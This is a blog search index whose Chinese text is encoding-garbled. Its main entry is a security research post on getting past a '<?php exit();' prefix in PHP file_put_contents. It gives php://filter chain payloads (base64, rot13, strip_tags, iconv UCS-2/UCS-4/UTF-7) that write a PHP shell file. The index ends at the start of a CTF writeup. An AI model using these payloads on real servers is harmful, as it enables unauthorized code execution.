<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>å…³äºfile_put_contentsçš„ä¸€äº›å°æµ‹è¯•</title>
    <url>/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/</url>
    <content><![CDATA[<p>æ˜¨å¤©çœ‹äº†ç¯‡æ–‡ç« <a href="https://mp.weixin.qq.com/s/kfYF157ux_VAOymU5l5RFA" target="_blank" rel="noopener">ä¸€æ¬¡â€œSSRFâ€“&gt;RCEâ€çš„è‰°éš¾åˆ©ç”¨</a>ï¼Œè¢«é‡Œé¢çš„å„ç§éªšæ“ä½œç»™ç§€åˆ°äº†ï¼Œå‘ç°<code>file_put_contents</code>è¿™ä¸ªå¾ˆæœ‰æ„æ€ï¼Œç»•è¿‡<code>&lt;?php exit();</code>GetShellä¹Ÿç»å¸¸æœ‰äººæå‡ºä¸åŒçš„æ€è·¯ï¼Œè¿™é‡Œç®€å•çš„åšä¸€ä¸‹æµ‹è¯•å’Œè®°å½•ã€‚</p>
<h1 id="file-put-contents-filename-â€-lt-php-exit-â€-content"><a href="#file-put-contents-filename-â€-lt-php-exit-â€-content" class="headerlink" title="file_put_contents($filename,â€&lt;?php exit();â€.$content);"></a>file_put_contents($filename,â€&lt;?php exit();â€.$content);</h1><blockquote>
<p><strong>å‰æ</strong>ï¼šè¿™ç§æ˜¯å‰åä¸¤ä¸ªå˜é‡ä¸åŒï¼Œå‡è®¾$filename,$contentæˆ‘ä»¬éƒ½å¯æ§æƒ…å†µ</p>
</blockquote>
<p>è¿™ç§æƒ…å†µç›¸å¯¹è¾ƒä¸ºç®€å•ï¼Œå…ˆæ‹æ¸…æ€è·¯ï¼Œ$filenameæ§åˆ¶çš„å†™å…¥çš„æ–‡ä»¶åï¼Œ$contentæ‹¼æ¥åœ¨äº†<code>&lt;?php exit();</code>åï¼Œæ‰€ä»¥æƒ³è¦GetShellçš„è¯ï¼Œå°±å¿…é¡»æŠŠ<code>&lt;?php exit();</code>ç»™å¹²æ‰ï¼Œè€Œéƒ½çŸ¥é“$filenameæ˜¯æ§åˆ¶æ–‡ä»¶åçš„ï¼Œå¦‚æœæˆ‘ä»¬ä½¿ç”¨<strong>php://filter</strong>åè®®çš„è¯ï¼Œè¿™ä¼šå…ˆæŒ‰<strong>php://filter</strong>è§„å®šçš„åè®®å¯¹$contentè¿›è¡Œè§£ç åå†å†™å…¥åè®®ï¼Œæ›´å¼ºå¤§çš„æ˜¯<strong>php://filter</strong>è¿˜æ”¯æŒä½¿ç”¨å¤šä¸ªè¿‡æ»¤å™¨è§„åˆ™ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥æ¥ä¸ªè¿ç¯æ“ä½œã€‚æ‰€ä»¥æ€è·¯å¾ˆç®€å•ï¼Œç›®æ ‡å°±æ˜¯æŠŠ<code>&lt;?php exit();</code>è§£ç ä¸ºphpä¸è®¤è¯†çš„å­—ç¬¦ï¼Œè€Œæˆ‘ä»¬æ„é€ çš„å†…å®¹èƒ½å¤Ÿæ­£å¸¸çš„è§£ç å‡ºæ¥å°±å¯ä»¥ã€‚è¿™ä¸ªåœ¨phith0nä¹‹å‰çš„æ–‡ç« é‡Œæœ‰äº†å¾ˆè¯¦ç»†çš„ä»‹ç»<a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" target="_blank" rel="noopener">ä¼ é€é—¨</a>ï¼Œè¿™é‡Œç®€å•çš„ä»‹ç»ä¸€ä¸‹</p>
<h2 id="0x01-Base64ç¼–ç "><a href="#0x01-Base64ç¼–ç " class="headerlink" title="0x01 Base64ç¼–ç "></a>0x01 Base64ç¼–ç </h2><p>æœ€å¸¸ç”¨çš„å°±æ˜¯base64ç¼–ç äº†ï¼Œé€šè¿‡è§£ç æŠŠ<code>&lt;?php exit();</code>è§£ç ä¸ºä¹±ç ï¼Œè€Œåé¢æˆ‘ä»¬ä¼ å…¥çš„webshellçš„base64å†…å®¹è¢«æ­£å¸¸è§£ç ï¼Œå°±å¯ä»¥ç›´æ¥å¹²æ‰<code>&lt;?php exit();</code>å¾—åˆ°ä¸€ä¸ªshelläº†,ä¸è¿‡ç”±äº<code>&lt;?php exit();</code>ä¸­åªæœ‰phpexitå‚ä¸äº†è§£ç ï¼Œç”±äºbase64è§£ç æ—¶4è½¬3,æ‰€ä»¥éœ€è¦è¡¥ä¸€ä½å¦‚ğŸ‘‡</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span> =&gt; PD9waHAgcGhwaW5mbygpOz8+ =&gt; aPD9waHAgcGhwaW5mbygpOz8+ -&gt; $content</span><br><span class="line">php:<span class="comment">//filter/write=convert.base64-decode/resource=Cyc1e.php  -&gt; $filename</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/image-20200403151021554.png" alt></p>
<h2 id="0x02-Rot13ç¼–ç "><a href="#0x02-Rot13ç¼–ç " class="headerlink" title="0x02 Rot13ç¼–ç "></a>0x02 Rot13ç¼–ç </h2><p>åŒæ ·ï¼Œä¹Ÿå¯ä»¥åˆ©ç”¨rot13ç¼–ç æ¥ç»•è¿‡ï¼ŒåŸç†å’ŒBase64ç¼–ç æ˜¯ä¸€æ ·çš„ï¼Œå°±ä¸å¤šèµ˜è¿°äº†ï¼Œå¦‚ä¸‹ğŸ‘‡</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>php phpinfo();<span class="meta">?&gt;</span> =&gt; <span class="meta">&lt;?</span>cuc cucvasb();<span class="meta">?&gt;</span> -&gt; $content</span><br><span class="line">php://<span class="built_in">filter</span>/<span class="built_in">write</span>=<span class="keyword">string</span>.rot13/resource=Cyc1e.php  -&gt; $filename</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/image-20200403151425262.png" alt></p>
<p>è¿™ç§æ–¹æ³•æ˜¯éœ€è¦æœåŠ¡å™¨<strong>æ²¡æœ‰å¼€å¯çŸ­æ ‡ç­¾</strong>çš„æ—¶å€™æ‰å¯ä»¥ä½¿ç”¨ï¼ˆé»˜è®¤æƒ…å†µæ˜¯æ²¡å¼€å¯çš„ï¼šphp.iniä¸­çš„short_open_tagï¼‰</p>
<h2 id="0x03-ç»„åˆæ‹³"><a href="#0x03-ç»„åˆæ‹³" class="headerlink" title="0x03 ç»„åˆæ‹³"></a>0x03 ç»„åˆæ‹³</h2><p>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨<strong>php://filter</strong>å­—ç¬¦ä¸²å¤„ç†æ–¹æ³•&amp;&amp;ç¼–ç çš„æ–¹æ³•ç»•è¿‡<code>&lt;?php exit();</code>ï¼Œç›¸å¯¹äºç›´æ¥ç¼–ç å°±æœ‰ç‚¹å¤šæ­¤ä¸€ä¸¾äº†ï¼Œä¸è¿‡çŸ¥é“æœ‰è¿™ä¸ªæ–¹æ³•å°±å¥½äº†ï¼Œä¾‹å¦‚åˆ©ç”¨strip_tagsæ–¹æ³•æ¥ç›´æ¥å»é™¤xmlï¼Œè€Œæˆ‘ä»¬ä¼ å…¥çš„shellæ˜¯base64ç¼–ç è¿‡çš„ï¼Œæ‰€ä»¥ä¸ä¼šè¢«å»é™¤ï¼Œå†è§£ç å³å¯ï¼Œå‰é¢ä¹Ÿè¯´äº†<strong>php://filter</strong>æ˜¯æ”¯æŒä½¿ç”¨å¤šä¸ªå¤šæ»¤å™¨çš„ï¼Œæ‰€ä»¥æ„é€ å¦‚ä¸‹ğŸ‘‡</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>php phpinfo();<span class="meta">?&gt;</span> =&gt; PD9waHAgcGhwaW5mbygpOz8+ =&gt;<span class="meta">?&gt;</span>PD9waHAgcGhwaW5mbygpOz8+ -&gt; $content <span class="comment">#è¿™é‡Œç”±äº`&lt;?php exit();`ä¸æ˜¯å®Œæ•´çš„æ ‡ç­¾ï¼Œæ‰€ä»¥éœ€è¦è¡¥ä¸Šâ€™?&gt;â€˜è¿›è¡Œè¡¥å…¨</span></span><br><span class="line">php://<span class="built_in">filter</span>/<span class="built_in">write</span>=<span class="keyword">string</span>.strip_tags|<span class="built_in">convert</span>.base64-decode/resource=Cyc1e.php  -&gt; $filename</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/image-20200403152859574.png" alt></p>
<h1 id="file-put-contents-a-â€-lt-php-exit-â€-a"><a href="#file-put-contents-a-â€-lt-php-exit-â€-a" class="headerlink" title="file_put_contents($a,â€&lt;?php exit();â€.$a);"></a>file_put_contents($a,â€&lt;?php exit();â€.$a);</h1><blockquote>
<p><strong>å‰æ</strong>ï¼šè¿™ç§æ˜¯å‰åä¸¤ä¸ªå˜é‡ç›¸åŒï¼Œå‡è®¾$aå¯æ§æƒ…å†µ</p>
</blockquote>
<p>è¿™ç§ç›¸åŒå˜é‡çš„æ„é€ æ–¹å¼å’Œä¸åŒå˜é‡çš„æ„é€ æ–¹å¼æ€è·¯æ˜¯å¤§å·®ä¸å·®çš„ï¼Œéƒ½æ˜¯éœ€è¦å¹²æ‰<code>&lt;?php exit();</code>ï¼Œåªä¸è¿‡æ„é€ èµ·æ¥ç›¸å¯¹æ›´å¤æ‚ä¸€äº›ï¼Œè¿™é‡Œä¹Ÿç®€å•è®°å½•ä¸‹æµ‹è¯•çš„å†…å®¹ğŸ‘‡</p>
<h2 id="0x01-Base64"><a href="#0x01-Base64" class="headerlink" title="0x01 Base64"></a>0x01 Base64</h2><p>è¿™é‡Œå’Œä¸Šé¢å¯¹åº”ä¸Šï¼Œä¸è¿‡ç»è¿‡ä¸ªäººæµ‹è¯•ï¼Œç›´æ¥åªç”¨Base64çš„æ–¹å¼æ˜¯<strong>ä¸è¡Œçš„</strong>ï¼ï¼ˆå¦‚æœæœ‰æ„é€ å‡ºæ¥çš„ï¼Œåˆ†äº«ä¸€ä¸‹ï¼‰ï¼Œæ¥ä¸‹æ¥è®²è®²ä¸ºä½•ä¸ªäººè§‰å¾—ä¸è¡Œ ~</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">file<span class="constructor">_put_contents($<span class="params">a</span>,<span class="string">"&lt;?php exit();"</span>.$<span class="params">a</span>)</span>;</span><br></pre></td></tr></table></figure>

<p>æ ¹æ®å‰é¢ä»‹ç»çš„ä¸åŒå˜é‡çš„æ„é€ æ–¹æ³•ï¼Œå¾ˆå®¹æ˜“æ‹“å±•åˆ°ç›¸åŒçš„å˜é‡ï¼ŒåŒæ ·åˆ©ç”¨<strong>php://filter</strong>æ¥æ„é€ ï¼Œåæ­£åé¢æ˜¯å†™å…¥çš„å†…å®¹ï¼Œåªè¦åœ¨åé¢è§£ç çš„æ—¶å€™æŠŠshellè§£ç å‡ºæ¥ï¼Œä¸éœ€è¦çš„ä¸œè¥¿è§£ç æˆä¹±ç å³å¯ï¼Œè€ŒBase64æ„é€ çš„è¯ï¼Œä¾‹å¦‚</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">a</span> = php://<span class="built_in">filter</span>/<span class="built_in">write</span>=<span class="built_in">convert</span>.base64-decode|PD9waHAgcGhwaW5mbygpOz8+|/resource=Cyc1e.php</span><br></pre></td></tr></table></figure>

<p>æ„é€ çš„shellå¯ä»¥æ”¾åœ¨è¿‡æ»¤å™¨çš„ä½ç½®å’Œæ–‡ä»¶åä½ç½®éƒ½å¯ä»¥ï¼ˆå…¶ä»–ç¼–ç æœ‰æ—¶å€™ä¼šæœ‰ç©ºæ ¼ä»€ä¹ˆçš„ä¹±ç ï¼Œæ–‡ä»¶åä¸ä¸€å®šå¥½ç”¨ï¼‰ï¼Œphp://filteré¢å¯¹ä¸å¯ç”¨çš„è§„åˆ™æ˜¯æŠ¥ä¸ªWarningï¼Œç»•åè·³è¿‡ç»§ç»­æ‰§è¡Œçš„ï¼ˆä¸ä¼šé€€å‡ºï¼‰ï¼Œæ‰€ä»¥æŒ‰ç†è¯´è¿™æ ·æ„é€ æ˜¯<strong>â€œå¾ˆå®Œç¾â€</strong>çš„ï¼Œæˆ‘ä»¬çœ‹ä¸‹base-decodeå“ªäº›å­—ç¬¦ğŸ‘‡</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">php<span class="regexp">//</span>filter<span class="regexp">/write=convertbase64decodePD9waHAgcGhwaW5mbygpOz8+/</span>resource=Cyc1e.php</span><br></pre></td></tr></table></figure>

<p>è€Œé»˜è®¤æƒ…å†µä¸‹base64ç¼–ç æ˜¯ä»¥ <strong>=</strong> ä½œä¸ºç»“å°¾çš„ï¼Œæ‰€ä»¥æ­£å¸¸è§£ç çš„æ—¶å€™åˆ°äº† = å°±è§£ç ç»“æŸäº†ï¼Œå³ä½¿æˆ‘ä»¬æ„é€ payloadçš„æ—¶å€™ä¸ç”¨<code>write=</code>ï¼Œä½†æ˜¯åœ¨æœ€åè·å–æ–‡ä»¶åçš„æ—¶å€™<code>resource=</code>ä¸­çš„ = è¿‡ä¸æ‰ï¼Œæ‰€ä»¥å¯¼è‡´è¿‡æ»¤å™¨è§£ç å¤±è´¥ï¼Œä»è€ŒæŠ¥é”™ï¼ˆä¸è¿‡è¿˜æ˜¯ä¼šåˆ›å»ºæ–‡ä»¶çš„ï¼Œå†…å®¹ç”±äºè§£ç è¿‡ç¨‹å‡ºé”™äº†ï¼Œå°±éƒ½ä¸¢å¼ƒäº†ï¼‰ğŸ‘‡</p>
<p><img src="/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/image-20200403160120749.png" alt></p>
<p>æˆ‘ä»¬ä¹Ÿå¯ä»¥ç®€å•çš„æµ‹è¯•ä¸€ä¸‹æ˜¯å¦æ˜¯ <strong>=</strong> å‡ºçš„é—®é¢˜ï¼Œ</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="comment">#3.php</span></span><br><span class="line">&lt;?php</span><br><span class="line">$filename=<span class="string">"php://filter/write=convert.base64-decode/resource=Cyc1e.php"</span>;</span><br><span class="line">$content=<span class="string">"PD9waHAgcGhwaW5mbygpOz8+"</span>;</span><br><span class="line">file_put_contents($filename,<span class="string">"&lt;?PHP exit();//="</span>.$content);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/image-20200403160208500.png" alt></p>
<p>ç»“æœæ˜¯ä¸€æ ·çš„ï¼Œæ‰€ä»¥å¯ä»¥ç¡®å®šæ˜¯ <strong>=</strong> å‡ºçš„é—®é¢˜ï¼Œè¦æ˜¯æœ‰ç»•è¿‡çš„æ„é€ æ–¹æ³•ï¼Œæ¬¢è¿åˆ†äº«ã€‚</p>
<h2 id="0x02-Rot13"><a href="#0x02-Rot13" class="headerlink" title="0x02 Rot13"></a>0x02 Rot13</h2><p>rot13ç¼–ç å°±ä¸å­˜åœ¨base64çš„é—®é¢˜ï¼Œæ‰€ä»¥å’Œå‰é¢base64æ„é€ çš„æ€è·¯ä¸€æ ·ğŸ‘‡</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">a</span> = php://<span class="built_in">filter</span>/<span class="built_in">write</span>=<span class="keyword">string</span>.rot13|<span class="meta">&lt;?</span>cuc cucvasb();<span class="meta">?&gt;</span>|/resource=Cyc1e.php</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/image-20200403160545137.png" alt></p>
<p>å’Œå‰é¢æåˆ°çš„ä¸€æ ·ï¼Œè¿™ç§æ–¹æ³•æ˜¯éœ€è¦æœåŠ¡å™¨<strong>æ²¡æœ‰å¼€å¯çŸ­æ ‡ç­¾</strong>çš„æ—¶å€™æ‰å¯ä»¥ä½¿ç”¨ï¼ˆé»˜è®¤æƒ…å†µæ˜¯æ²¡å¼€å¯çš„ï¼šphp.iniä¸­çš„short_open_tagï¼‰</p>
<h2 id="0x03-iconvå­—ç¬¦ç¼–ç è½¬æ¢"><a href="#0x03-iconvå­—ç¬¦ç¼–ç è½¬æ¢" class="headerlink" title="0x03 iconvå­—ç¬¦ç¼–ç è½¬æ¢"></a>0x03 iconvå­—ç¬¦ç¼–ç è½¬æ¢</h2><p>è¿™ç§æ–¹æ³•ç”±äºä¹‹å‰æ²¡æœ‰è§è¿‡ï¼Œæ‰€ä»¥æ„Ÿè§‰è¿™æ³¢æ“ä½œæ¯”æˆ‘çš„äºšç´¢è¿˜è¦ç§€~ï¼Œæƒ³æ³•æ˜¯ä¸€æ ·çš„ï¼Œé€šè¿‡å­—ç¬¦è½¬æ¢æŠŠ<code>&lt;?php exit();</code>è½¬æˆä¸èƒ½è§£æçš„ï¼Œè¿™é‡Œé‡‡ç”¨çš„æ˜¯UCS-2æˆ–è€…UCS-4ç¼–ç æ–¹å¼ï¼Œè€Œæˆ‘ä»¬æ„é€ çš„è½¬æˆå¯æ­£å¸¸è§£æçš„ã€‚ğŸ‘‡</p>
<figure class="highlight lisp"><table><tr><td class="code"><pre><span class="line">#echo iconv(<span class="string">"UCS-2LE"</span>,<span class="string">"UCS-2BE"</span>,'&lt;?php phpinfo()<span class="comment">;?&gt;');</span></span><br><span class="line">?&lt;hp phpipfn(<span class="name">o</span><span class="comment">;)&gt;?</span></span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œç”¨çš„æ˜¯UCS-2ï¼Œå½“ç„¶æˆ‘ä»¬ä¹Ÿå¯ä»¥ç”¨UCS-4ğŸ‘‡</p>
<figure class="highlight lisp"><table><tr><td class="code"><pre><span class="line">echo iconv(<span class="string">"UCS-4LE"</span>,<span class="string">"UCS-4BE"</span>,'aa&lt;?php phpinfo()<span class="comment">;?&gt;');</span></span><br><span class="line">?&lt;aa phpiphp(<span class="name">ofn&gt;</span>?<span class="comment">;)</span></span><br></pre></td></tr></table></figure>

<p>é€šè¿‡UCS-2æˆ–è€…UCS-4çš„æ–¹å¼ï¼Œå¯¹ç›®æ ‡å­—ç¬¦ä¸²è¿›è¡Œ2/4ä½ä¸€åè½¬ï¼Œä¹Ÿå°±æ˜¯è¯´æ„é€ çš„éœ€è¦æ˜¯UCS-2æˆ–UCS-4ä¸­2æˆ–è€…4çš„å€æ•°ï¼Œä¸ç„¶ä¸èƒ½è¿›è¡Œåè½¬ï¼Œé‚£æˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨è¿™ç§è¿‡æ»¤å™¨è¿›è¡Œç¼–ç è½¬æ¢ç»•è¿‡äº†ï¼Œæ„é€ payloadğŸ‘‡</p>
<figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line">$a=<span class="string">'php://filter//convert.iconv.UCS-2LE.UCS-2BE|?&lt;hp phpipfn(o;)&gt;?/resource=Cyc1e.php'</span><span class="comment">;</span></span><br><span class="line">**<span class="literal">or</span>**</span><br><span class="line">$a=<span class="string">'php://filter//convert.iconv.UCS-4LE.UCS-4BE|xxx?&lt;aa phpiphp(ofn&gt;?;)/resource=Cyc1e.php'</span><span class="comment">;</span></span><br><span class="line"><span class="meta">#ç”±äºæ˜¯4ä½ä¸€åè½¬ï¼Œæ‰€ä»¥éœ€è¦ä¿è¯?&lt;aa phpiphp(ofn&gt;?<span class="comment">;)ä¹‹å‰å­—ç¬¦ä¸ªæ•°æ˜¯4çš„å€æ•°ï¼Œæ‰€ä»¥éœ€è¦è¡¥3ä¸ªå­—ç¬¦</span></span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/image-20200403162535114.png" alt></p>
<p><img src="/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/image-20200403162950176.png" alt></p>
<p>å½“ç„¶è¿™ç§æ–¹æ³•å¯¹äºå‰åä¸åŒå˜é‡ä¹Ÿæ˜¯ä¸€æ ·é€‚ç”¨çš„<del>~</del></p>
<h2 id="0x04-ç»„åˆæ‹³"><a href="#0x04-ç»„åˆæ‹³" class="headerlink" title="0x04 ç»„åˆæ‹³"></a>0x04 ç»„åˆæ‹³</h2><h3 id="ç¬¬ä¸€å¥—è¿æ‹›"><a href="#ç¬¬ä¸€å¥—è¿æ‹›" class="headerlink" title="ç¬¬ä¸€å¥—è¿æ‹›"></a>ç¬¬ä¸€å¥—è¿æ‹›</h3><p>å’Œå‰åä¸åŒçš„å˜é‡çš„åˆ©ç”¨ä¸€æ ·ï¼Œç›¸åŒå˜é‡ä¸€æ ·å¯ä»¥ä½¿ç”¨ç»„åˆæ‹³ï¼Œè¿™é‡Œå°±ç”¨UCS-2å’Œrot13ä¸¾ä¸€ä¸ªä¾‹å­å§ğŸ‘‡</p>
<figure class="highlight nix"><table><tr><td class="code"><pre><span class="line">$<span class="attr">a</span> = 'php://filter/<span class="attr">write=convert.iconv.UCS-2LE.UCS-2BE|string.rot13|x?&lt;uc</span> cucvcsa(b;)&gt;?/<span class="attr">resource=Cyc1e.php';</span> <span class="comment">#åŒæ ·éœ€è¦è¡¥ä½ï¼Œè¿™é‡Œè¡¥äº†ä¸€ä¸ªx</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/image-20200403165229869.png" alt></p>
<p>ä¸ºä½•ä¸ç”¨string.strip_tagså‘¢ï¼Ÿå› ä¸ºrot13è½¬æ¢çš„åŒæ ·ä¼šè¢«strip_tagsæ–¹æ³•ç»™åˆ é™¤äº†ï¼Œè€ŒUCS-2æˆ–UCS-4æ„é€ çš„ä¹ŸåŒæ ·ä¼šè¢«strip_tagsæ–¹æ³•ç»™åˆ é™¤ï¼Œè¿™é‡Œéœ€è¦æ‰¾å…¶ä»–çš„ç¼–ç æ–¹å¼è¿›è¡Œæ„é€ ï¼Œè¿™é‡Œåšä¸ªå°tipsï¼Œç”±äºstrip_tagså»é™¤çš„æ˜¯ä¸€ä¸ªé—­åˆçš„æ ‡ç­¾æ‰€ä»¥<code>?&gt;</code>å¯ä»¥æ”¾åœ¨æˆ‘ä»¬æ„é€ çš„shellç¼–ç å‰ï¼Œè¿™æ ·åœ¨contentsä¸Šå°±ç›´æ¥æŠŠshellå‰çš„å­—ç¬¦å»äº†ï¼Œåªè¦shellçš„ç¼–ç ä¸ä¼šè¢«åˆ é™¤ï¼Œå°±å¯ä»¥è§£ç å›shellå†™å…¥æ–‡ä»¶ä¸­ï¼Œæœ¬èœæ‡’ï¼Œå°±ä¸ä¸€ä¸ªä¸€ä¸ªè¿‡æ»¤å™¨è¯•äº†<del>~</del></p>
<h3 id="ç¬¬äºŒå¥—è¿æ‹›"><a href="#ç¬¬äºŒå¥—è¿æ‹›" class="headerlink" title="ç¬¬äºŒå¥—è¿æ‹›"></a>ç¬¬äºŒå¥—è¿æ‹›</h3><p>å‰é¢ä»‹ç»å•ç‹¬ç”¨base64ç¼–ç æ˜¯ä¸å¯è¡Œçš„ï¼Œé‚£ä¹ˆæ¥ä¸€å¥—ç»„åˆæ‹³æ˜¯å¦å¯ä»¥å‘¢ï¼Ÿç­”æ¡ˆè‚¯å®šæ˜¯å¯ä»¥çš„ï¼Œè¿™é‡Œæ„Ÿè°¢å¤§å…„å¼Ÿ<a href="http://yulige.top" target="_blank" rel="noopener">éƒç¦»æ­Œ</a>æä¾›çš„æ–¹æ³•ï¼Œé€šè¿‡iconvå°†utf8ç¼–ç è½¬ä¸ºutf7ç¼–ç ï¼Œä»è€ŒæŠŠ <strong>=</strong> ç»™è½¬äº†ï¼Œå°±ä¸ä¼šå½±å“åˆ°base64çš„è§£ç äº†ğŸ‘‡</p>
<figure class="highlight maxima"><table><tr><td class="code"><pre><span class="line">$a='php://filter/<span class="built_in">convert</span>.iconv.utf-<span class="number">8.</span>utf-<span class="number">7</span>|<span class="built_in">convert</span>.<span class="built_in">base64</span>-decode|AAPD9waHAgcGhwaW5mbygpOz8+/resource=Cyc1e.php'; #<span class="built_in">base64</span>ç¼–ç å‰è¡¥äº†AAï¼ŒåŸç†ä¸€æ ·ï¼Œè¡¥é½ä½æ•°</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬çœ‹ä¸€ä¸‹è½¬ç åçš„ç»“æœ</p>
<figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="attribute">UTF-8</span>:<span class="attribute">php</span>:<span class="comment">//filter/convert.iconv.utf-8.utf-7|convert.base64-decode|AAPD9waHAgcGhwaW5mbygpOz8+/resource=Cyc1e.php</span></span><br><span class="line">ğŸ‘‡</span><br><span class="line"><span class="attribute">UTF-7</span>:<span class="attribute">php</span>:<span class="comment">//filter/convert.iconv.utf-8.utf-7+AHw-convert.base64-decode+AHw-AAPD9waHAgcGhwaW5mbygpOz8+-/resource+AD0-Cyc1e.php</span></span><br></pre></td></tr></table></figure>

<p>è¿™æ ·å°±æˆåŠŸçš„æŠŠ <strong>=</strong> ç»™è½¬äº†ï¼Œbase64ç¼–ç æ²¡æœ‰å—åˆ°å½±å“ï¼Œä¸€æ ·å¯ä»¥æ­£å¸¸çš„è§£ç ~</p>
<p><img src="/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/image-20200403193558288.png" alt></p>
<p>æ‰€ä»¥å¯¹äºbase64çš„è¿ç”¨ï¼Œåªè¦æ‰¾åˆ°ä¸€ä¸ªèƒ½æŠŠ <strong>=</strong> è½¬äº†åŒæ—¶åˆä¸å½±å“base64ç¼–ç åçš„å­—ç¬¦çš„è½¬ç æ–¹å¼å³å¯<del>~</del></p>
<h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>ç®€å•çš„è®°å½•äº†ä¸€ä¸‹æœ¬èœçš„æµ‹è¯•è¿‡ç¨‹ï¼Œè¿‡æ»¤å™¨åªç”¨äº†æåˆ°çš„å’Œå¸¸ç”¨çš„ï¼Œå½“ç„¶<strong>php://filter</strong>è¿˜æœ‰å…¶ä»–çš„è¿‡æ»¤å™¨æ˜¯å¯ä»¥ç”¨çš„ï¼Œä¸è¿‡æ€»ç»“èµ·æ¥è¯´ï¼Œæ€è·¯éƒ½æ˜¯ä¸€æ ·çš„ï¼Œå°±æ˜¯å¦‚ä½•æŠŠ<code>&lt;?php exit();</code>ç»™<strong>â€åƒæ‰â€œ</strong>ï¼Œè®©è‡ªå·±æ„é€ çš„shellå¯ä»¥æ­£å¸¸è¿è¡Œï¼Œç®€å•æ€»ç»“äº†è¿™ç§æ–¹æ³•ï¼Œå½“ç„¶ï¼Œæ–¹æ³•ä¸‡åƒï¼Œå¸ˆå‚…ä»¬æœ‰å¥½çš„æ–¹æ³•ä¹Ÿæ¬¢è¿åˆ†äº«ï¼ˆç™½å«–ï¼‰<del>~</del></p>
<p>tipsï¼š<code>file_put_contents</code>å’Œ<code>file_get_contents</code>è¿™ä¸¤ä¸ªå‡½æ•°è¿˜æ˜¯å¾ˆæœ‰æ„æ€çš„ï¼Œfile_get_contentsä¹Ÿæœ‰å¾ˆå¤šç‰¹æ€§ï¼Œä¸‹æ¬¡æœ‰æ—¶é—´å†å†™</p>
]]></content>
      <categories>
        <category>Cyc1eçš„æ¼æ´åˆ†æä¹‹è·¯</category>
      </categories>
      <tags>
        <tag>file_put_contents</tag>
        <tag>php://filter</tag>
      </tags>
  </entry>
  <entry>
    <title>GXZYCTFéƒ¨åˆ†Web Writeup</title>
    <url>/2020/03/09/GXZYCTF%E9%83%A8%E5%88%86Web-Writeup/</url>
    <content><![CDATA[<p><strong>å¾ˆé•¿ä¸€æ®µæ—¶é—´æ²¡æœ‰æ¥è§¦äº†ï¼Œéƒ½æ²‰è¿·äºè¯¾ç¨‹å­¦ä¹ ä¸èƒ½è‡ªæ‹”ï¼ˆè¢«è¿«çš„ï¼‰ï¼Œæœç„¶2020å¹´å¯¹é¢˜ç›®éƒ½å¤±å»äº†æ„Ÿè§‰ï¼Œä¸ä»…å¦‚æ­¤ï¼Œåˆšæ‰“å¼€å°±æƒ³xäº†â€¦â€¦ï¼Œç®€å•å…ˆæ•´ç†ä¸€ä¸‹åšå‡ºæ¥çš„é¢˜ã€‚</strong></p>
<h3 id="0x00-Webtmp"><a href="#0x00-Webtmp" class="headerlink" title="0x00 Webtmp"></a>0x00 Webtmp</h3><p>é¢˜ç›®æºç </p>
